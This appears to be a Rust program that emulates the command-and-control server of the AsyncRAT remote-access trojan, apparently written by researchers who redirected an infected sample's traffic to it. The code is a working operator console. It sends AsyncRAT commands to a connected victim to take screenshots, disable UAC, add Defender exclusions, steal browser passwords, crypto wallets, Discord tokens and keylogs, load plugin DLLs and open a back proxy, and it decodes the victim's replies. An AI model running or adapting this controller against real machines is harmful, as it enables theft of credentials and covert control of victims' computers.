use tokio::{net::TcpListener, io::{AsyncReadExt, AsyncWriteExt, BufReader, AsyncBufReadExt}};
use std::{fs, io::{self, Cursor, Read, Write}, sync::Arc, time::SystemTime, collections::HashMap};
use flate2::{read::GzDecoder, write::GzEncoder, Compression};
use native_tls::{Identity, TlsAcceptor as NativeTlsAcceptor};
use tokio_native_tls::{TlsStream, TlsAcceptor};
use rmp_serde::{from_slice, to_vec};
use serde::{Deserialize, Serialize};
use tokio::sync::{mpsc, Mutex};
use serde_json::Value;
use log::{info, error};

/*
    Run command with openssl to generate a pfx key we can use for TLS
    cargo install rustls-cert-gen
    rustls-cert-gen --output certs/ --san 127.0.0.1,localhost
    openssl pkcs12 -export -out identity.pfx -inkey cert.key.pem -in cert.pem -password pass:toor

    Then used mitmproxy to proxy traffic from the machine running the AsyncRAT 
    to the IP of the host running the rust server, and in fiddler, we are 
    modifying the GET request the virus makes to pastebin containing the IP 
    address of the C2 server, and making it 127.0.0.1:4443 (the port that 
    mitmproxy is listening to)

    mitmproxy --mode reverse:tls://{RUST_SERVER_ADDRESS}:1030 
        --listen-port 4443 
        --set ssl_version_client_min=TLS1_2 
        --set ssl_version_client_max=TLS1_2 
        --set ssl_version_server_min=TLS1_2
        --set ssl_version_server_max=TLS1_2 
        --set ssl_insecure=true

*/
// Configure logging
fn setup_logging() {
    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info"))
        .format(|buf, record| {
            writeln!(
                buf,
                "{} - {} - {}",
                SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap()
                    .as_secs(),
                record.level(),
                record.args()
            )
        })
        .init();
}

// Enum for AsyncRAT commands
#[derive(Debug, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "lowercase")]
enum Command {
    // Received by virus
    Getscreen,
    Uacoff,
    Killps { ps: String },
    Resethosts,
    Weburl { link: String, ext: String },
    Chrome,
    Plugin { dll: String, hash: Option<String> },
    Saveplugin { hash: String, dll: String },
    Passload,
    Wallets,
    Fox,
    Dicordtokens,
    Setxt { code: String },
    Wdexclusion,
    Killproxy,
    Net35,
    Klget,
    Avast,
    Block { site: String },
    Webbrowserpass,
    Gettxt,
    Anydesk,
    Backproxy { host: String, port: String },
    // Sent by virus
    Loge { id: String },
    Sendplugin { hashes: String },
    Allinone { password: String, hwid: String },
    KlgetResponse { logs: String, hwid: String },
    Cbget { message: String },
    Pong { message: String },
    Received,
    #[serde(rename = "Error")]
    CommandError { error: String },
    ClientInfo { fields: HashMap<String, String> },
}

impl Command {
    fn to_packet(&self) -> Value {
        let mut map = serde_json::Map::new();
        match self {
            Command::Getscreen => {
                map.insert("Packet".to_string(), Value::String("getscreen".to_string()));
            },
            Command::Uacoff => {
                map.insert("Packet".to_string(), Value::String("uacoff".to_string()));
            },
            Command::Killps { ps } => {
                map.insert("Packet".to_string(), Value::String("killps".to_string()));
                map.insert("PS".to_string(), Value::String(ps.clone()));
            }
            Command::Resethosts => {
                map.insert("Packet".to_string(), Value::String("ResetHosts".to_string()));
            },
            Command::Weburl { link, ext } => {
                map.insert("Packet".to_string(), Value::String("weburl".to_string()));
                map.insert("link".to_string(), Value::String(link.clone()));
                map.insert("Ext".to_string(), Value::String(ext.clone()));
            }
            Command::Chrome => {map.insert("Packet".to_string(), Value::String("Chrome".to_string()));},
            Command::Plugin { dll, hash } => {
                map.insert("Packet".to_string(), Value::String("plugin".to_string()));
                map.insert("Dll".to_string(), Value::String(dll.clone()));
                if let Some(hash) = hash {
                    map.insert("Hash".to_string(), Value::String(hash.clone()));
                }
            }
            Command::Saveplugin { hash, dll } => {
                map.insert("Packet".to_string(), Value::String("savePlugin".to_string()));
                map.insert("Hash".to_string(), Value::String(hash.clone()));
                map.insert("Dll".to_string(), Value::String(dll.clone()));
            }
            Command::Passload => {map.insert("Packet".to_string(), Value::String("passload".to_string()));},
            Command::Wallets => {map.insert("Packet".to_string(), Value::String("Wallets".to_string()));},
            Command::Fox => {map.insert("Packet".to_string(), Value::String("Fox".to_string()));},
            Command::Dicordtokens => {map.insert("Packet".to_string(), Value::String("DicordTokens".to_string()));},
            Command::Setxt { code } => {
                map.insert("Packet".to_string(), Value::String("setxt".to_string()));
                map.insert("code".to_string(), Value::String(code.clone()));
            }
            Command::Wdexclusion => {map.insert("Packet".to_string(), Value::String("WDExclusion".to_string()));},
            Command::Killproxy => {map.insert("Packet".to_string(), Value::String("KillProxy".to_string()));},
            Command::Net35 => {map.insert("Packet".to_string(), Value::String("Net35".to_string()));},
            Command::Klget => {map.insert("Packet".to_string(), Value::String("klget".to_string()));},
            Command::Avast => {map.insert("Packet".to_string(), Value::String("Avast".to_string()));},
            Command::Block { site } => {
                map.insert("Packet".to_string(), Value::String("Block".to_string()));
                map.insert("site".to_string(), Value::String(site.clone()));
            }
            Command::Webbrowserpass => {map.insert("Packet".to_string(), Value::String("WebBrowserPass".to_string()));},
            Command::Gettxt => {map.insert("Packet".to_string(), Value::String("gettxt".to_string()));},
            Command::Anydesk => {map.insert("Packet".to_string(), Value::String("anydesk".to_string()));},
            Command::Backproxy { host, port } => {
                map.insert("Packet".to_string(), Value::String("backproxy".to_string()));
                map.insert("Host".to_string(), Value::String(host.clone()));
                map.insert("Port".to_string(), Value::String(port.clone()));
            }
            Command::Loge { id } => {
                map.insert("Packet".to_string(), Value::String("loge".to_string()));
                map.insert("ID".to_string(), Value::String(id.clone()));
            }
            Command::Sendplugin { hashes } => {
                map.insert("Packet".to_string(), Value::String("sendPlugin".to_string()));
                map.insert("Hashes".to_string(), Value::String(hashes.clone()));
            }
            Command::Allinone { password, hwid } => {
                map.insert("Packet".to_string(), Value::String("AllInOne".to_string()));
                map.insert("Password".to_string(), Value::String(password.clone()));
                map.insert("Hwid".to_string(), Value::String(hwid.clone()));
            }
            Command::KlgetResponse { logs, hwid } => {
                map.insert("Packet".to_string(), Value::String("klget".to_string()));
                map.insert("Logs".to_string(), Value::String(logs.clone()));
                map.insert("Hwid".to_string(), Value::String(hwid.clone()));
            }
            Command::Cbget { message } => {
                map.insert("Packet".to_string(), Value::String("cbget".to_string()));
                map.insert("Message".to_string(), Value::String(message.clone()));
            }
            Command::Pong { message } => {
                map.insert("Packet".to_string(), Value::String("pong".to_string()));
                map.insert("Message".to_string(), Value::String(message.clone()));
            }
            Command::Received => {
                map.insert("Packet".to_string(), Value::String("Received".to_string()));
            },
            Command::ClientInfo { fields} => { 
                for (command, val) in fields.iter() {
                    map.insert(command.clone(), Value::String(val.clone()));
                }
            },
            Command::CommandError { error } => {
                map.insert("Packet".to_string(), Value::String("Error".to_string()));
                map.insert("Error".to_string(), Value::String(error.clone()));
            },
        };
        let val = Value::Object(map);
        log::info!("Packet To Send: {val:#?}");
        val
    }

    fn from_input(input: &str) -> Option<Self> {
        let parts: Vec<&str> = input.trim().split_whitespace().collect();
        if parts.is_empty() {
            return None;
        }
        match parts[0].to_lowercase().as_str() {
            "getscreen" => Some(Command::Getscreen),
            "uacoff" => Some(Command::Uacoff),
            "killps" => parts.get(1).map(|ps| Command::Killps { ps: ps.to_string() }),
            "resethosts" => Some(Command::Resethosts),
            "getcb" => parts.get(1).map(|cb| Command::Cbget { message: cb.to_string() }),
            "weburl" => {
                if parts.len() >= 3 {
                    Some(Command::Weburl {
                        link: parts[1].to_string(),
                        ext: parts[2].to_string(),
                    })
                } else {
                    None
                }
            }
            "chrome" => Some(Command::Chrome),
            "plugin" => {
                if parts.len() >= 2 {
                    Some(Command::Plugin {
                        dll: parts[1].to_string(),
                        hash: parts.get(2).map(|s| s.to_string()),
                    })
                } else {
                    None
                }
            }
            "saveplugin" => {
                if parts.len() >= 3 {
                    Some(Command::Saveplugin {
                        hash: parts[1].to_string(),
                        dll: parts[2].to_string(),
                    })
                } else {
                    None
                }
            }
            "passload" => Some(Command::Passload),
            "wallets" => Some(Command::Wallets),
            "fox" => Some(Command::Fox),
            "dicordtokens" => Some(Command::Dicordtokens),
            "setxt" => parts.get(1).map(|code| Command::Setxt { code: code.to_string() }),
            "wdexclusion" => Some(Command::Wdexclusion),
            "killproxy" => Some(Command::Killproxy),
            "net35" => Some(Command::Net35),
            "klget" => Some(Command::Klget),
            "avast" => Some(Command::Avast),
            "block" => parts.get(1).map(|site| Command::Block { site: site.to_string() }),
            "webbrowserpass" => Some(Command::Webbrowserpass),
            "gettxt" => Some(Command::Gettxt),
            "anydesk" => Some(Command::Anydesk),
            "backproxy" => {
                if parts.len() >= 3 {
                    Some(Command::Backproxy {
                        host: parts[1].to_string(),
                        port: parts[2].to_string(),
                    })
                } else {
                    None
                }
            }
            _ => None,
        }
    }
}

impl TryFrom<&Value> for Command {
    type Error = String;
    
    fn try_from(value: &Value) -> Result<Self, Self::Error> {
        let obj = value.as_object().ok_or("Expected JSON object")?;

        let packet = obj
            .get("Packet")
            .and_then(Value::as_str)
            .ok_or("Missing or invalid 'Packet' field")?
            .to_lowercase();

        match packet.as_str() {
            "ping" => {
                let message = obj.get("Message")
                    .and_then(Value::as_str)
                    .unwrap_or("")
                    .to_string();

                Ok(Command::Pong { message })
            }

            "gettxt" => Ok(Command::Gettxt),

            "loge" => {
                let id = obj.get("ID")
                    .and_then(Value::as_str)
                    .unwrap_or("")
                    .to_string();

                Ok(Command::Loge { id })
            }

            "clientinfo" => {
                let mut fields = HashMap::new();
                for (k, v) in obj {
                    if let Some(s) = v.as_str() {
                        fields.insert(k.clone(), s.to_string());
                    }
                }
                Ok(Command::ClientInfo { fields })
            }

            other => Err(format!("Unrecognized Packet type: {:?}", other)),
        }
    }

}


async fn handle_stdin(tx: mpsc::UnboundedSender<Command>) {
    let mut reader = BufReader::new(tokio::io::stdin());
    let mut line = String::new();
    
    loop {
        line.clear();
        match reader.read_line(&mut line).await {
            Ok(0) => {
                info!("Stdin closed");
                break;
            }
            Ok(_) => {
                if let Some(cmd) = Command::from_input(&line) {
                    info!("Received stdin command: {:?}", cmd);
                    if let Err(e) = tx.send(cmd) {
                        error!("Failed to send command: {}", e);
                    }
                } else {
                    info!("Invalid command: {}", line.trim());
                }
            }
            Err(e) => {
                error!("Error reading stdin: {}", e);
                break;
            }
        }
    }
}

async fn handle_client(
    stream: TlsStream<tokio::net::TcpStream>,
    addr: std::net::SocketAddr,
    rx: Arc<Mutex<mpsc::UnboundedReceiver<Command>>>,
) {
    info!("New connection from {}", addr);
    let (mut reader, mut writer) = tokio::io::split(stream);
    let mut full_data = Vec::new();
    let mut buffer = [0u8; 4096];

    loop {
        let mut rx = rx.lock().await;

        tokio::select! {
            // Receive TCP stream data
            result = reader.read(&mut buffer) => {
                match result {
                    Ok(0) => {
                        info!("Connection closed by {}", addr);
                        break;
                    }
                    Ok(n) => {
                        let data = &buffer[..n];
                        log::debug!("Raw packet from {}: {}", addr, hex::encode(data));

                        // Search for GZIP magic bytes (1f 8b 08)
                        let gzip_start = data.windows(3).position(|w| w == [0x1f, 0x8b, 0x08]);
                        let stripped_data = match gzip_start {
                            Some(idx) => &data[idx..],
                            None => {
                                error!("No GZIP header found in packet from {}", addr);
                                continue;
                            }
                        };

                        full_data.extend_from_slice(stripped_data);

                        // Decompress
                        let decompressed = match {
                            let mut decoder = GzDecoder::new(Cursor::new(stripped_data));
                            let mut out = Vec::new();
                            decoder.read_to_end(&mut out).map(|_| out)
                        } {
                            Ok(d) => {
                                log::debug!("Decompressed {} bytes from {}", d.len(), addr);
                                d
                            }
                            Err(e) => {
                                error!("Decompression failed from {}: {}", addr, e);
                                continue;
                            }
                        };

                        // Deserialize MessagePack to JSON
                        let parsed_json: Result<Value, _> = from_slice(&decompressed);
                        let output = match parsed_json {
                            Ok(json_val) => {
                                match Command::try_from(&json_val) {
                                    Ok(cmd) => {
                                        info!("{cmd:#?}");
                                        format!("Parsed Command: {:?}", cmd)
                                    },
                                    Err(e) => {
                                        log::error!("{e:?}");
                                        format!("Unrecognized Command JSON: {}", json_val)
                                    },
                                }
                            }
                            Err(e) => format!("Failed to parse MessagePack: {}", e),
                        };

                        log::debug!(
                            "Packet from {}:\nText: {}\nDecompressed: {}",
                            addr,
                            String::from_utf8_lossy(&decompressed),
                            output
                        );

                        let response = Command::Getscreen.to_packet();
                        let msgpack_data = to_vec(&response).expect("Serialization failed");
                        let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
                        encoder.write_all(&msgpack_data).expect("Compression failed");
                        let mut compressed_response = encoder.finish().expect("Finish compression failed");
                        let mut prefixed_response = vec![0x03, 0x00, 0x00];
                        prefixed_response.append(&mut compressed_response);

                        if let Err(e) = writer.write_all(&prefixed_response).await {
                            error!("Failed to send response to {}: {}", addr, e);
                        } else {
                            info!("Sent Gettxt response to {}", addr);
                        }
                    }
                    Err(e) => {
                        error!("Error reading from {}: {}", addr, e);
                        break;
                    }
                }
            }

            // Send command from stdin to the client
            result = rx.recv() => {
                if let Some(cmd) = result {
                    let json_packet = cmd.to_packet();
                    let msgpack_data = to_vec(&json_packet).expect("Serialization failed");
                    let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
                    encoder.write_all(&msgpack_data).expect("Compression failed");
                    let mut compressed = encoder.finish().expect("Finish compression failed");
                    let mut packet = vec![0x03, 0x00, 0x00];
                    packet.append(&mut compressed);

                    if let Err(e) = writer.write_all(&packet).await {
                        error!("Error sending command to {}: {}", addr, e);
                    } else {
                        info!("Sent command to {}: {:?}", addr, cmd);
                    }
                }
            }
        }
    }

    // Post-connection cleanup & final logging
    let hex_full = hex::encode(&full_data);
    let text_full = String::from_utf8_lossy(&full_data);

    let decompressed = match {
        let mut decoder = GzDecoder::new(Cursor::new(&full_data[..]));
        let mut out = Vec::new();
        decoder.read_to_end(&mut out).map(|_| out)
    } {
        Ok(data) => {
            info!("Full stream decompressed from {}: {} bytes", addr, data.len());
            data
        }
        Err(e) => {
            error!("Full stream decompression failed from {}: {}", addr, e);
            Vec::new()
        }
    };

    let final_parsed = match from_slice::<Value>(&decompressed) {
        Ok(json) => format!("{:#}", json),
        Err(e) => format!("MessagePack parse error: {}", e),
    };

    log::debug!(
        "Connection {} closed.\nHex: {}\nText: {}\nDecompressed JSON: {}",
        addr, hex_full, text_full, final_parsed
    );
}


#[tokio::main]
async fn main() -> io::Result<()> {
    setup_logging();
    let listener = TcpListener::bind("0.0.0.0:1030").await?;
    info!("Server listening on 0.0.0.0:1030");

    // Channel for stdin commands
    let (tx, rx) = mpsc::unbounded_channel();
    let rx = Arc::new(Mutex::new(rx));
    
    // Spawn stdin handler
    tokio::spawn({
        async move {
            handle_stdin(tx.clone()).await;
        }
    });

    let identity = load_identity("certs/identity.pfx", "toor").unwrap();

    // Create native_tls acceptor
    let native_acceptor = NativeTlsAcceptor::builder(identity)
        .max_protocol_version(Some(native_tls::Protocol::Tlsv12))
        .min_protocol_version(Some(native_tls::Protocol::Tlsv12))
        .build()
        .unwrap();

    // Wrap in tokio's async acceptor
    let acceptor = TlsAcceptor::from(native_acceptor);

    loop {
        let (tcp_stream, addr) = listener.accept().await?;
        let acceptor = acceptor.clone();
        let rx = Arc::clone(&rx);

        tokio::spawn(async move {
            match acceptor.accept(tcp_stream).await {
                Ok(tls_stream) => {
                    info!("TLS handshake successful from {}", addr);
                    // hand off to your decrypted handler
                    handle_client(tls_stream, addr, rx).await;
                }
                Err(e) => error!("TLS handshake failed: {}", e),
            }
        });
    }
}

// Loads PKCS12 identity from file for native_tls
fn load_identity(path: &str, password: &str) -> anyhow::Result<Identity> {
    let pkcs12 = fs::read(path)?;
    let identity = Identity::from_pkcs12(&pkcs12, password)?;
    Ok(identity)
}